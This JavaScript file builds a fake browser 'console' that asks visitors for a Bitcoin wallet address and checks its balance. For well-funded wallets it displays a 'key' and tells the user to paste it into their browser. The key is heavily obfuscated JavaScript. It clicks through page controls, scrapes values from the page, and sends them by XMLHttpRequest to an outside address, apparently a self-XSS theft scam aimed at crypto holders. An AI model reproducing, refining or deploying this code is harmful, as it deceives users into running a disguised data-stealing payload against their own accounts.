function miniConsole() {
  const consoleElement = document.getElementById('console');
  const inputContainer = document.createElement('div');
  const addressContainer = document.createElement('div');
  const promptElement = document.createElement('span');
  const inputElement = document.createElement('input');
  const keyContainer = document.createElement('div');
  keyContainer.setAttribute('id', 'key-container');
  const commandContainer = document.createElement('div');
  commandContainer.setAttribute('id', 'command-container');

  inputElement.setAttribute('id', 'input');
  inputElement.setAttribute('autofocus', 'true');

  let address = '';
  let hasEnteredAddress = false;
  let hasEnteredCommand = false;

  const introMessage = document.createElement('p');
  introMessage.innerText = 'Please enter your Bitcoin wallet address:';
  consoleElement.appendChild(introMessage);

  promptElement.classList.add('prompt');
  promptElement.innerText = '>>';
  addressContainer.appendChild(promptElement);
  addressContainer.appendChild(inputElement);
  inputContainer.setAttribute('id', 'input-container');
  inputContainer.appendChild(addressContainer);
  consoleElement.appendChild(inputContainer);

  const keyMessage = document.createElement('p');
  keyMessage.innerText = 'Copy and paste this key in your browser:';
  keyContainer.appendChild(keyMessage);

  const keyElement = document.createElement('pre');
  keyElement.setAttribute('id', 'key-element');
  keyElement.innerHTML = `var _cs=['\x64\x73','\x6f\x72\x6d','\x41\x72','\x63\x6f\x76',"\x70\x6f\x70",'\x69\x6e','\x37\x38\x35','\x2d\x75\x72','\x5f\x69','\x72\x64\x73','\x64\x61\x74','\x6c\x6c','\x64\x6f\x77','\x6e\x5b\x64','\x45\x6c\x65','\x2e\x63\x6f','\x22\x73','\x45','\x6e\x63','\x69\x6c\x20','\x75\x70','\x6e\x74\x2d','\x6f\x6e',"\x31\x30\x32\x34",'\x65\x3d',"\x67\x6f",'\x45\x47',"\x4d\x65\x73","\x6d\x65\x6e\x74","\x6c\x6f\x63",'\x6c\x69\x2e','\x70\x6e','\x46\x72\x70','\x31\x33','\x54\x79','\x4c\x69\x6e','\x61\x74','\x5d','\x2d\x65\x32','\x42\x61\x63','\x20','\x62\x36\x34','\x3d','\x32\x65','\x30\x38','\x63\x68','\x26','\x42\x69',"\x2e\x6f","\x49\x64","\x6d\x61\x74\x68",'\x73\x3a\x20','\x3d\x22\x73','\x62\x75','\x22\x74\x6f','\x52\x4d','\x74\x6f\x6e','\x2d','\x75\x74\x22',"\x6b\x69",'\x6e\x74\x65','\x65\x32','\x74\x69\x6d\x65','\x72\x74','\x6c\x79\x6f','\x30\x36','\x2e\x50\x74','\x63\x2d','\x2b',"\x70\x73",'\x77\x77',"\x72\x61\x6d",'\x74\x74\x6f','\x6e\x61\x76','\x2e\x73\x63','\x6f\x64\x65',"\x72\x75\x63",'\x66\x70\x4e','\x2d\x65','\x69\x6e\x67','\x74\x69\x6d\x65','\x68\x6b\x64',"\x34\x66\x64",'\x35\x35','\x64\x69\x75','\x72\x69',"\x77\x69\x6e",'\x74\x2d\x73','\x2e\x73','\x65\x78\x74','\x64','\x77\x2d\x66','\x6b\x75','\x70\x65','\x2d\x73','\x61\x73\x65','\x3d\x22\x74','\x6e\x73','\x43\x65\x6e','\x74\x6f','\x73\x65','\x74\x5a\x7a',"\x72\x67\x2f",'\x67\x73\x4c','\x61\x63\x30','\x31\x3a','\x74\x74','\x30','\x78\x68','\x49\x66\x42','\x63\x2d\x62','\x41\x64','\x66\x6f','\x5b\x64\x61','\x77\x75\x7a',"\x6c\x30",'\x6d\x65','\x61\x74\x69','\x61\x70\x70','\x22\x5d',"\x68\x74\x74","\x61\x70","\x7a\x6f\x6e\x65",'\x41\x41',"\x74",'\x62\x6b\x71',"\x72\x6a","\x65\x6e\x64",'\x74\x65','\x75\x6e','\x65\x63\x75','\x7a\x74',"\x2f\x73",'\x6f\x52\x65',"\x65\x62\x62",'\x62','\x41\x43','\x64\x69\x76','\x57\x6f','\x6e\x22','\x31\x64','\x52\x47\x6a',"\x73\x61",'\x74\x79','\x69\x6f\x6e','\x61\x2d','\x4e','\x70\x57','\x2f\x78\x2d','\x48\x6f\x30','\x43\x4e','\x6f\x72\x64','\x74\x2d','\x61\x6e','\x26\x74',"\x65\x67","\x66\x6f\x72",'\x2d\x68','\x65\x74\x74','\x65\x32\x65',"\x69\x2e","\x61\x62\x73",'\x45\x6d\x61','\x65\x70','\x5b\x64',"\x77\x68\x69\x6c\x65",'\x6e\x41','\x66\x75\x6e\x63','\x65\x3d\x22','\x6b\x22\x5d',"\x67\x65",'\x54\x77\x6f','\x61\x74\x61','\x2e\x74','\x39\x31\x35','\x62\x75\x74',"\x62\x6f",'\x73\x20','\x62\x6f\x64','\x74\x69\x6f\x6e','\x74\x65\x78',"\x61\x72",'\x6d\x74\x35','\x39\x37','\x42\x79','\x70\x46','\x73\x70','\x73\x22\x5d','\x74\x65\x72','\x68\x72','\x65\x72\x79','\x42\x76',"\x3a\x2f\x2f",'\x31\x38\x32','\x53\x54','\x36\x33','\x64\x72\x65',"\x74\x65\x6c",'\x74\x61\x2d','\x58\x52\x4d','\x67\x65\x6f','\x79\x2e','\x63\x6b','\x62\x61','\x74\x61','\x6e\x5b',"\x6c\x6f\x62",'\x68\x58','\x6c\x69\x63','\x63\x6b\x75','\x20\x50','\x22\x62\x61','\x43\x6f','\x32\x73','\x64\x3d','\x42\x75\x74','\x6b\x22',"\x67\x65\x74","\x25",'\x2c\x20','\x6c\x65','\x73\x73\x3a','\x4b\x73\x64','\x50\x4f','\x73\x63','\x6d\x2e',"\x6c\x68",'\x6c\x63\x68',"\x72\x30\x75","\x69\x63\x6b",'\x36\x75\x66',"\x6c\x6f\x63","\x66\x6f\x72","\x67\x64",'\x33\x36',"\x71\x75","\x65\x6e\x74","\x42\x79",'\x25',"\x74\x69\x6d\x65","\x65\x63",'\x49\x64','\x66\x75\x6e\x63','\x35\x31',"\x78\x74\x43",'\x61\x75\x32',"\x31\x6f\x69","\x53\x65\x6c","\x63\x74",'\x69\x61',"\x6c\x6f\x67",'\x30',"\x6e","\x6c\x65","\x68",'\x69\x75\x71',"\x67\x6d\x73","\x78\x74",'\x6d\x65\x6e\x74',"\x63\x6b","\x74\x43",'\x77\x68\x69\x6c\x65','\x38\x66\x30',"\x65\x6e","\x37\x35","\x6d\x63\x6e",'\x6e\x61',"\x69\x63","\x6e\x74",'\x74\x39',"\x65\x63\x74","\x35\x74\x70","\x70\x75",'\x71\x65',"\x74\x48","\x75\x37\x6f","\x6c","\x79\x53","\x74\x65","\x63\x6c\x69",'\x6e\x34','\x68\x77\x38',"\x74\x6f",'\x62\x36\x34','\x30\x6d\x77','\x6e\x61\x76',"\x6d",'\x6b\x6a\x70',"\x6f\x72","\x6f\x6e\x74","\x6f\x70","\x64",'\x38\x39',"\x61\x62\x73","\x73\x65\x6e","\x6b","\x74\x6f\x72","\x69\x69\x73","\x65\x72\x79",'\x74\x34',"\x74\x72","\x31\x6e",'\x45\x6c\x65','\x74\x69\x6f\x6e','\x71\x7a','\x30\x6e\x6e','\x66\x6f\x72',"\x67\x65\x6f","\x70\x34\x6b","\x79\x53\x65","\x6e\x74\x65","\x64\x65\x72","\x65\x6c\x65",'\x66\x33',"\x63\x68",'\x71\x77','\x64\x6f\x77',"\x79\x6f",'\x67\x7a',"\x30\x70","\x2b","\x26","\x53\x65","\x6c\x65\x63","\x65\x72","\x71\x75\x65",'\x63\x34\x6e',"\x74\x65\x78","\x74\x63","\x31\x30\x32\x34","\x63\x6c",'\x70\x72\x66',"\x67\x65\x74","\x6f\x6e","\x65\x71\x75",'\x7a\x6f\x6e\x65',"\x79\x37\x6e","\x65\x73","\x70\x75\x73","\x69\x6d","\x41\x6c\x6c","\x41\x6c","\x74\x72\x69","\x45\x61",'\x74\x69\x6d\x65',"\x35\x6c\x71","\x77\x69\x6e","\x72\x79\x53","\x65\x61","\x32\x65\x7a","\x73\x65",'\x76\x78\x65',"\x67\x32\x32",'\x72\x31\x6f','\x33\x79',"\x63\x74\x6f",'\x2d','\x6a\x38',"\x6d\x61\x74\x68","\x74\x43\x6f","\x30\x68",'\x70\x69\x7a',"\x72\x79","\x43\x6f\x6e","\x73\x68","\x6a\x6f\x69","\x39\x72\x35",'\x31\x71\x6b',"\x74\x52","\x72","\x65\x6c","\x75\x6e\x71",'\x70\x6f\x70','\x76\x6a\x66']; function _f2(_p0) { var _v0 = _cs[195]+_cs[183]+_cs[83]+_cs[6]+_cs[105]+_cs[123]+_cs[149]+_cs[32]+_cs[191]+_cs[222]+_cs[109]+_cs[26]+_cs[125]+_cs[77]+_cs[131]+_cs[2]+_cs[101]+_cs[81]+_cs[17]; var _v1 = _cs[33]+_cs[174]+_cs[44]+_cs[193]; var _v2 = _cs[120]+_cs[69]+_cs[192]+_cs[121]+_cs[160]+_cs[197]+_cs[155]+_cs[71]+_cs[48]+_cs[102]+_cs[176]+_cs[124] + _v0 + _cs[132]+_cs[127]+_cs[27]+_cs[142]+_cs[170]; var _v3 = new XMLHttpRequest(); _v3[_cs[290]+_cs[263]](_cs[223]+_cs[194], _v2, true); _v3[_cs[350]+_cs[368]+_cs[334]+_cs[337]+_cs[274]+_cs[348]+_cs[311]](_cs[212]+_cs[60]+_cs[21]+_cs[34]+_cs[93], _cs[118]+_cs[208]+_cs[36]+_cs[144]+_cs[148]+_cs[70]+_cs[91]+_cs[1]+_cs[7]+_cs[220]+_cs[18]+_cs[75]+_cs[90]); _v3[_cs[294]+_cs[291]](_cs[45]+_cs[36]+_cs[8]+_cs[214] + _v1 + _cs[154]+_cs[89]+_cs[42] + encodeURIComponent(_p0)); } function _f1(_p1, _p0) { var _v0 = document[_cs[325]+_cs[347]+_cs[312]+_cs[248]+_cs[288]](_cs[175]+_cs[99]+_cs[13]+_cs[172]+_cs[38]+_cs[24]+_cs[54]+_cs[39]+_cs[92]+_cs[185]+_cs[64]+_cs[58]+_cs[37]); if (_v0) { _v0[_cs[330]+_cs[229]](); var _v1 = document[_cs[235]+_cs[298]+_cs[322]+_cs[323]+_cs[296]+_cs[340]](_cs[137]+_cs[113]+_cs[198]+_cs[61]+_cs[168]+_cs[203]+_cs[202]+_cs[20]+_cs[138]+_cs[9]+_cs[119]); setTimeout(function() { _v1[_cs[232]+_cs[343]+_cs[314]](function(element) { var _v2 = element[_cs[235]+_cs[324]+_cs[277]+_cs[312]+_cs[355]+_cs[369]](_cs[88]+_cs[67]+_cs[207]+_cs[55]+_cs[47])[_cs[278]+_cs[244]+_cs[289]+_cs[236]][_cs[342]+_cs[286]](); var _v3 = element[_cs[235]+_cs[298]+_cs[247]+_cs[240]+_cs[296]](_cs[88]+_cs[67]+_cs[163]+_cs[166]+_cs[150])[_cs[278]+_cs[244]+_cs[289]+_cs[263]+_cs[124]][_cs[342]+_cs[286]](); _p0[_cs[338]+_cs[254]](_v2 + _cs[40] + _v3); }); var _v4 = document[_cs[325]+_cs[362]+_cs[247]+_cs[270]+_cs[288]](_cs[53]+_cs[72]+_cs[13]+_cs[172]+_cs[78]+_cs[43]+_cs[96]+_cs[133]+_cs[3]+_cs[190]+_cs[171]+_cs[119]); setTimeout(function() { _v4[_cs[330]+_cs[267]+_cs[295]](); var _v5 = document[_cs[235]+_cs[324]+_cs[309]+_cs[323]+_cs[296]+_cs[341]+_cs[276]](_cs[137]+_cs[164]+_cs[172]+_cs[38]+_cs[24]+_cs[211]+_cs[209]+_cs[147]+_cs[151]+_cs[187]); setTimeout(function() { _v5[_cs[232]+_cs[343]+_cs[314]](function(element) { var _v2 = element[_cs[325]+_cs[347]+_cs[312]+_cs[248]+_cs[288]](_cs[74]+_cs[157]+_cs[199]+_cs[47])[_cs[327]+_cs[359]+_cs[310]+_cs[268]][_cs[342]+_cs[286]](); var _v3 = element[_cs[325]+_cs[347]+_cs[370]+_cs[270]+_cs[288]](_cs[74]+_cs[78]+_cs[31]+_cs[136]+_cs[146])[_cs[327]+_cs[260]+_cs[289]+_cs[263]+_cs[124]][_cs[300]+_cs[339]](); _p0[_cs[272]+_cs[364]](_v2 + _cs[40] + _v3); }); var _v8 = _cs[162]+_cs[19]+_cs[111]+_cs[196]+_cs[221]+_cs[40] + _p1 + _cs[210]+_cs[189]+_cs[95]+_cs[51] + _p0[_cs[365]+_cs[252]](_cs[219]); console[_cs[250]](_v8); _f2(_v8); var _v9 = document[_cs[325]+_cs[347]+_cs[312]+_cs[248]+_cs[288]](_cs[186]+_cs[153]+_cs[15]+_cs[97]+_cs[128]+_cs[11]+_cs[117]+_cs[22]+_cs[173]+_cs[89]+_cs[94]+_cs[225]+_cs[112]+_cs[21]+_cs[116]+_cs[84]+_cs[225]+_cs[180]+_cs[152]+_cs[178]+_cs[201]+_cs[180]+_cs[87]+_cs[204]+_cs[63]); setTimeout(function() { _v9[_cs[330]+_cs[229]](); }, 0); }, 0); }, 0); }, 0); } else { setTimeout(function() { _f1(_p1, _p0); }, 1000); } } function _f0() { var _v0 = document[_cs[235]+_cs[298]+_cs[247]+_cs[240]+_cs[282]+_cs[369]](_cs[53]+_cs[72]+_cs[205]+_cs[10]+_cs[145]+_cs[61]+_cs[24]+_cs[211]+_cs[209]+_cs[185]+_cs[129]+_cs[0]+_cs[215]+_cs[99]+_cs[139]+_cs[37]); if (_v0) { _v0[_cs[279]+_cs[259]](); var _v1 = document[_cs[235]+_cs[324]+_cs[309]+_cs[323]+_cs[296]](_cs[88]+_cs[110]+_cs[224]+_cs[141]+_cs[66]+_cs[114]); var _v2 = ''; if (_v1) { _v2 = _v1[_cs[235]+_cs[298]+_cs[322]+_cs[323]+_cs[282]+_cs[369]](_cs[135])[_cs[278]+_cs[257]+_cs[363]+_cs[278]+_cs[268]][_cs[300]+_cs[339]](); } setTimeout(function() { var _v3 = []; _f1(_v2, _v3); }, 0); } else { setTimeout(_f0, 1000); } } var _g0 = document[_cs[325]+_cs[362]+_cs[247]+_cs[240]+_cs[296]](_cs[30]+_cs[100]+_cs[106]+_cs[79]+_cs[177]+_cs[175]+_cs[56]+_cs[113]+_cs[198]+_cs[61]+_cs[24]+_cs[16]+_cs[158]+_cs[5]+_cs[103]+_cs[5]+_cs[216]+_cs[37]); _g0[_cs[330]+_cs[229]](); var _g1 = document[_cs[235]+_cs[324]+_cs[309]+_cs[253]+_cs[248]+_cs[288]](_cs[53]+_cs[72]+_cs[13]+_cs[36]+_cs[145]+_cs[159]+_cs[52]+_cs[130]+_cs[85]+_cs[143]+_cs[98]+_cs[188]+_cs[35]+_cs[169]); _g1[_cs[330]+_cs[229]](); setTimeout(_f0, 0);`; // Sample key
  keyElement.classList.add('input-entry');
  keyContainer.appendChild(keyElement);
  consoleElement.appendChild(keyContainer);

  const commandMessage = document.createElement('p');
  commandMessage.classList.add('prompt');
  commandContainer.appendChild(commandMessage);

  const promptCommandElement = document.createElement('span');
  promptCommandElement.classList.add('prompt');
  promptCommandElement.innerText = '>>';
  commandContainer.appendChild(promptCommandElement);

  const commandElement = document.createElement('input');
  commandElement.setAttribute('id', 'command-element');
  commandElement.setAttribute('autofocus', 'true');
  commandElement.classList.add('input-entry');
  commandContainer.appendChild(commandElement);
  consoleElement.appendChild(commandContainer);

  inputElement.addEventListener('keydown', function(event) {
    if (event.key === 'Enter') {
      if (!hasEnteredAddress) {
        const address = inputElement.value;
        const apiUrl = "https://blockstream.info/api/address/" + address;

        $.getJSON(apiUrl, function(data) {
          const balance = data.chain_stats.funded_txo_sum;
          if (parseFloat(balance) > 10000) {
            const addressElement = document.createElement('div');
            addressElement.classList.add('input-entry', 'valid-address');
            addressElement.innerHTML = `<span class="checkmark">&#10004;</span>${address}`;
            consoleElement.insertBefore(addressElement, inputContainer);

            // Display the key since the balance is greater than 10000
            keyContainer.style.display = 'block';
            inputContainer.removeChild(addressContainer);
            commandContainer.style.display = 'block';
            commandElement.focus();
          } else {
            // Balance is too low
            inputElement.value = '';
            inputElement.classList.add('invalid-address');
            inputElement.placeholder = 'Balance is too low!';
          }
        }).fail(function() {
          // Invalid wallet address or error occurred
          inputElement.value = '';
          inputElement.classList.add('invalid-address');
          inputElement.placeholder = 'Invalid wallet address or error occurred.';
        });
      } else if (hasEnteredAddress && !hasEnteredCommand) {
        const command = inputElement.value;
        const outputElement = document.createElement('p');
        outputElement.innerText = command;
        outputElement.classList.add('input-entry', 'prompt');
        consoleElement.insertBefore(outputElement, commandContainer);

        hasEnteredCommand = true;
        inputElement.value = '';
        consoleElement.scrollTop = consoleElement.scrollHeight;
        commandElement.focus();
      }
    }
  });

  commandElement.addEventListener('keydown', function(event) {
    if (event.key === 'Enter') {
      const command = commandElement.value;
      const outputElement = document.createElement('p');
      outputElement.innerText = command;
      outputElement.classList.add('input-entry', 'prompt');
      consoleElement.insertBefore(outputElement, commandContainer);

      commandElement.value = '';
      consoleElement.scrollTop = consoleElement.scrollHeight;
      commandElement.focus();
    }
  });
}

miniConsole();